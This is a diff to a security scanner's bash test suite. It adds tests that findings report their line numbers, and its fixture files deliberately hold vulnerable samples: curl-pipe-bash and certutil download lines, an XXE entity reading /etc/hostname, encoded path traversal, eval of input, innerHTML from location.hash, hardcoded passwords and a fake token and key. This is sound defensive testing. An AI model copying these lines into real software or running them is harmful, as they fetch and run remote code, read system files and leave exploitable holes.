@@ -3892,6 +3892,113 @@ STUB
     done
 fi
 
+# ══════════════════════════════════════════════
+# LAYER M — the lines of a finding
+# ══════════════════════════════════════════════
+# A finding of a built-in rule used to say which file and which rule, never where: findings[].line was always null.
+# It now names the first matching line (`line`), every matching line up to ten (`lines`) and how many lines match in all
+# (`line_count`). The message text is unchanged, so the allowlist, the severity and every stored message stay as they were.
+# A rule that searched a derived view of the file (comments stripped, continuations joined) has no line: null, never a
+# number that would point at the wrong place. These tests are written first and were seen failing before the change.
+group "Layer M — the lines of a finding (every match, at most ten)"
+if ! _skipping; then
+    MW="${SCRATCH}/m_work"; MR="${SCRATCH}/m_rep"; mkdir -p "$MW" "$MR"
+    m_scan() {   # m_scan <engine> <dir> <name>; sets MREP
+        MREP="${MR}/report_scan_$3.json"; rm -f "$MREP"
+        (cd "$ROOT_DIR" && TRANSIT_ENGINE="$1" WORK_DIR="$MW" timeout 300 bash ./scan_pipeline.sh "$2" "$MR" "$3" >/dev/null 2>&1) || true
+    }
+    m_py() { python3 -c "
+import json, sys
+d = json.load(open(sys.argv[1]))
+print(eval(sys.argv[2]))" "$@" 2>/dev/null || echo "unreadable"; }
+    # m_get <file as the report names it> <fragment of the message>: "line|lines|line_count" of the first such finding
+    m_get() { m_py "$MREP" "next(('%s|%s|%s' % (f['line'], f['lines'], f['line_count']) for f in d['findings'] if f['file'] == sys.argv[3] and sys.argv[4] in f['message']), 'NOFINDING')" "$1" "$2"; }
+
+    MD="${SCRATCH}/m_repo"; rm -rf "$MD"; mkdir -p "$MD"/{app,notes,web,lib,scripts,public,deploy,infra,src,data,tools,keys,ps}
+    # the trigger is always on a known line: it is the number the assertions expect
+    printf '%s\n' '# settings' 'import os' 'DEBUG = False' 'password = "hunter2hunter2"' 'HOST = "localhost"' > "$MD/app/settings.py"
+    M_TOK="ghp_$(printf '%s' 'Ab3dE6gH9jK2mN5pQ8sT1vW4yZ7bC0eF3hJ6')"     # assembled here: no contiguous token in this file
+    M_EXC="ghp_$(printf '%s' 'EXAMPLEAb3dE6gH9jK2mN5pQ8sT1vW4yZ7bC')"     # a placeholder token: the exclusion list drops it
+    printf '%s\n' '# Setup' '' 'Deploy token, do not share:' '' "TOKEN=${M_TOK}" "OLD_TOKEN=${M_EXC}" > "$MD/notes/setup.md"
+    mkdir -p "$MD/pkg"
+    printf '%s\n' '{' '  "name": "x",' '  "dependencies": { "csrf-token": "^2.0.0" },' '  "password": "hunter2hunter2"' '}' > "$MD/pkg/package.json"
+    printf '%s\n' 'links' 'GET /files/..%2f..%2fetc' 'ok' 'ok' '%2e%2e/secret' 'ok' 'ok' 'ok' 'x..%5cwin' 'ok' > "$MD/web/links.txt"
+    for _i in 1 2 3 4 5 6 7 8 9 10 11 12; do printf '%s\n' "row ${_i} ..%2fup"; done > "$MD/web/many.txt"
+    printf '%s\n' 'import math' '' 'def calc(expr):' '    # evaluate a user expression' '    x = math.sqrt(4)' '    y = 2' '    return eval(expr)' > "$MD/lib/calc.py"
+    printf '%s\n' '#!/bin/sh' 'set -eu' 'curl -fsSL http://example.invalid/x.sh | bash' > "$MD/scripts/install.sh"
+    printf '%s\n' '// app' 'const el = document.getElementById("x");' '' 'el.innerHTML = location.hash;' > "$MD/public/app.js"
+    printf '%s\n' 'FROM ubuntu:22.04' 'USER app' 'RUN curl -fsSL http://example.invalid/i.sh | bash' > "$MD/Dockerfile"
+    printf '%s\n' 'name: app' 'spec:' '  replicas: 2' '  env:' '    password: "s3cretvalue"' > "$MD/deploy/app.yaml"
+    printf '%s\n' 'resource "aws_db_instance" "db" {' '  engine = "postgres"' '  username = "admin"' '  password = "hunter2hunter2"' '}' > "$MD/infra/main.tf"
+    printf '%s\r\n' 'import os' 'x = 1' 'y = eval(x)' > "$MD/src/crlf.py"                       # CRLF line endings
+    printf 'start\0\0\n%s\n%s\n' 'x' 'GET /..%2fetc' > "$MD/data/binary.txt"                    # a NUL byte on line 1: the file is binary to grep
+    printf '%s\r\n' '@echo off' 'REM fetch' 'certutil -urlcache -f http://example.invalid/a.exe a.exe' > "$MD/tools/fetch.bat"   # searched as a view
+    printf '%s\n' '<?xml version="1.0"?>' '<!DOCTYPE d [' '  <!ENTITY xxe' '    SYSTEM "file:///etc/hostname">' ']>' '<d>&xxe;</d>' > "$MD/ps/cmd.cdxml"   # the match starts on line 3 and spans two
+    M_BODY='MIIEvQIBADANBgkqhkiG9w0BAQEFAASCBKcwggSjAgEAAoIBAQC7VJTUt9Us8cKj'
+    printf '%s\n' "-----BEGIN RSA ""PRIVATE KEY-----" "$M_BODY" "$M_BODY" "$M_BODY" "-----END RSA ""PRIVATE KEY-----" > "$MD/keys/server.key"
+    printf '%s\n' 'a note about ..%2f' > "$MD/notes/a_first.txt"
+    python3 -c "
+import zipfile
+z = zipfile.ZipFile('$MD/notes/z_last.zip', 'w'); z.writestr('n.txt', 'hello'); z.close()"       # a finding from a source that has no line
+    printf '%s\n' 'readme' > "$MD/README.md"
+
+    for ME in bash python; do
+        m_scan "$ME" "$MD" "m_all_$ME"
+        assert_eq "FAIL" "$(m_py "$MREP" "d['verdict']")" "lines [$ME]: the fixture repository fails (the scan itself is unchanged)"
+        assert_eq "4|[4]|1" "$(m_get app/settings.py CWE-798:hardcoded_credential)" "lines [$ME]: a quoted credential on line 4"
+        assert_eq "5|[5]|1" "$(m_get notes/setup.md known_credential_format_github_token)" "lines [$ME]: a known credential format: the line of the token, not of the file, and not the line of a placeholder token"
+        assert_eq "4|[4]|1" "$(m_get pkg/package.json CWE-798:hardcoded_credential_in_JSON)" "lines [$ME]: a rule with an exclusion: the matching line that the exclusion does not drop (line 3 matches the pattern and is a semver range)"
+        assert_eq "2|[2, 5, 9]|3" "$(m_get web/links.txt CWE-22:path_traversal_encoded)" "lines [$ME]: three matching lines are all reported, the first one is 'line'"
+        assert_eq "1|[1, 2, 3, 4, 5, 6, 7, 8, 9, 10]|12" "$(m_get web/many.txt CWE-22:path_traversal_encoded)" "lines [$ME]: twelve matches: the first ten, and the total"
+        assert_eq "7|[7]|1" "$(m_get lib/calc.py CWE-95:dynamic_code_execution_eval_exec)" "lines [$ME]: a Python rule (eval)"
+        assert_eq "3|[3]|1" "$(m_get scripts/install.sh CWE-78:remote_code_execution_curl_pipe_bash)" "lines [$ME]: a shell rule (curl | bash)"
+        assert_eq "4|[4]|1" "$(m_get public/app.js CWE-79:XSS_innerHTML_document_write)" "lines [$ME]: a JavaScript rule (innerHTML)"
+        assert_eq "3|[3]|1" "$(m_get Dockerfile CWE-78:RUN_curl_pipe_bash_supply_chain)" "lines [$ME]: a Dockerfile rule"
+        assert_eq "5|[5]|1" "$(m_get deploy/app.yaml CWE-798:inline_credential_in_yaml)" "lines [$ME]: a YAML rule"
+        assert_eq "4|[4]|1" "$(m_get infra/main.tf CWE-798:hardcoded_secret_in_terraform)" "lines [$ME]: a Terraform rule"
+        assert_eq "3|[3]|1" "$(m_get src/crlf.py CWE-95:dynamic_code_execution_eval_exec)" "lines [$ME]: a file with CRLF line endings is numbered like any other"
+        assert_eq "3|[3]|1" "$(m_get data/binary.txt CWE-22:path_traversal_encoded)" "lines [$ME]: a file that holds a NUL byte (binary to grep) still gets its line"
+        assert_eq "1|[1]|1" "$(m_get keys/server.key CWE-321:hardcoded_private_key)" "lines [$ME]: a private key: the line of its header"
+        assert_eq "3|[3]|1" "$(m_get ps/cmd.cdxml CWE-611:xxe_external_entity)" "lines [$ME]: a match over the folded file (a declaration split across two lines) starts on line 3"
+        assert_eq "None|[]|0" "$(m_get tools/fetch.bat CWE-78:bat_download_cradle)" "lines [$ME]: a rule that searched a derived view (comments stripped, continuations joined) has no line, never a wrong one"
+        assert_eq "None|[]|0" "$(m_get notes/z_last.zip archive:requires_dedicated_rescan)" "lines [$ME]: a finding that no matching rule produced has no line, whatever matched before it in another file"
+        assert_contains "$(m_py "$MREP" "d['file_results'][sys.argv[3]]['message']" "${MD}/web/links.txt")" "[FAIL] CWE-22:path_traversal_encoded" "lines [$ME]: the message is unchanged"
+        assert_eq "False" "$(m_py "$MREP" "any(__import__('re').search(r':line[0-9]', f['message']) for f in d['findings'] if f['tool'] == 'grep-pattern')")" "lines [$ME]: …and carries no line text (the allowlist and the severity read the message)"
+        # the HTML report: a Lines column next to the finding, escaped like the rest of the report
+        MHTML="${MR}/report_scan_m_all_${ME}.html"
+        assert_contains "$(cat "$MHTML" 2>/dev/null)" "<th>Lines</th>" "lines [$ME]: the HTML report has a Lines column"
+        assert_contains "$(cat "$MHTML" 2>/dev/null)" "CWE-22:path_traversal_encoded: 2, 5, 9" "lines [$ME]: …and names the three lines of the traversal finding"
+        assert_contains "$(cat "$MHTML" 2>/dev/null)" "CWE-22:path_traversal_encoded: 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 of 12" "lines [$ME]: …and says when the list is cut at ten"
+        # the Excel report: a Line column on the Findings tab
+        if python3 -c "import openpyxl" 2>/dev/null; then
+            MX="${MR}/m_all_${ME}.xlsx"
+            python3 "${ROOT_DIR}/generate_excel_report.py" "$MREP" "$MX" >/dev/null 2>&1 || true
+            MXL=$(python3 -c "
+from openpyxl import load_workbook
+ws = load_workbook('$MX')['Findings']
+head = [c.value for c in ws[1]]
+rows = [[c.value for c in r] for r in ws.iter_rows(min_row=2)]
+col = head.index('Line')
+print('|'.join(sorted('%s=%s' % (r[2], r[col] or '') for r in rows if r[2] in ('web/links.txt', 'web/many.txt', 'app/settings.py', 'tools/fetch.bat'))))" 2>/dev/null || echo "unreadable")
+            assert_contains "$MXL" "app/settings.py=4" "lines [$ME]: the Excel Findings tab has a Line column with the line of a finding"
+            assert_contains "$MXL" "web/links.txt=2, 5, 9" "lines [$ME]: …all the lines of a finding"
+            assert_contains "$MXL" "web/many.txt=1, 2, 3, 4, 5, 6, 7, 8, 9, 10 of 12" "lines [$ME]: …and the total when the list is cut"
+            assert_contains "$MXL" "tools/fetch.bat=" "lines [$ME]: …and an empty cell for a finding with no line"
+        else
+            skip_test "Excel Line column [$ME]" "openpyxl not installed"
+        fi
+    done
+    # the summary the launcher prints on a FAIL names file:line
+    if command -v jq >/dev/null 2>&1; then
+        run_pipeline "$MD" --quiet --no-zip --no-excel
+        assert_contains "$RUN_OUT" "app/settings.py:4" "lines: the launcher's summary names file:line"
+        assert_contains "$RUN_OUT" "web/links.txt:2  (3 lines match: 2, 5, 9)" "lines: …and every matching line of a finding that has several"
+        assert_not_contains "$RUN_OUT" "tools/fetch.bat:" "lines: …and leaves out a finding with no line"
+    else
+        skip_test "launcher summary names file:line" "jq not installed"
+    fi
+fi
+
 # ═════════════════════════════════════════════════════════════════════════════
 # LAYER F — Static checks on the pipeline itself
 # ═════════════════════════════════════════════════════════════════════════════
@@ -3982,8 +4089,11 @@ PY
     # matters — is parsed as options, and grep exits 2 with "unrecognized
     # option". `if` reads 2 as false, so the rule is silently inert: it never
     # fires and never complains. Same family as the two bugs above.
-    BAD=$(grep -nE '^grep_check(_i)?\(\)' "${ROOT_DIR}/scan_pipeline.sh" \
-          | grep -v -- '-e ' || true)
+    # The helpers also remember what they matched (the lines of a finding), so a definition may span several lines:
+    # the whole body is read, up to the closing brace.
+    BAD=$(awk '/^grep_check(_i)?\(\)/ { name = $1; body = $0; done = ($0 ~ /\}[[:space:]]*$/)
+                  while (!done && (getline ln) > 0) { body = body "\n" ln; if (ln ~ /^\}/) done = 1 }
+                  if (body !~ /-e /) print name }' "${ROOT_DIR}/scan_pipeline.sh" || true)
     if [[ -z "$BAD" ]]; then
         ok_test "grep_check helpers pass their pattern after -e"
     else
